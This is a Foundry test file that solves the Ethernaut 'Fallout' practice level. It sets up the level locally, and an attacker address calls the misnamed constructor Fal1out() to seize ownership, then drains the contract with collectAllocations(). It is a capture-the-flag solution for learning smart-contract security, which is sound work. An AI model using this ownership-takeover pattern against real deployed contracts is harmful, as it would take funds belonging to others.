// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {FalloutFactory} from "../src/levels/02-FalloutFactory.sol";
import {Fallout} from "../src/levels/02-Fallout.sol";
import {Ethernaut} from "../src/core/Ethernaut.sol";

contract FalloutSolution is Test {
    Ethernaut internal ethernaut;
    address internal attacker = address(1337);

    function solution(Fallout target) internal virtual {
        target.Fal1out();
        target.collectAllocations();
    }

    function testSolution() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether/10);

        FalloutFactory falloutFactory = new FalloutFactory();
        ethernaut.registerLevel(falloutFactory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(falloutFactory);
        Fallout falloutContract = Fallout(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        solution(falloutContract);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool isLevelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(isLevelSuccessfullyPassed);
    }
}
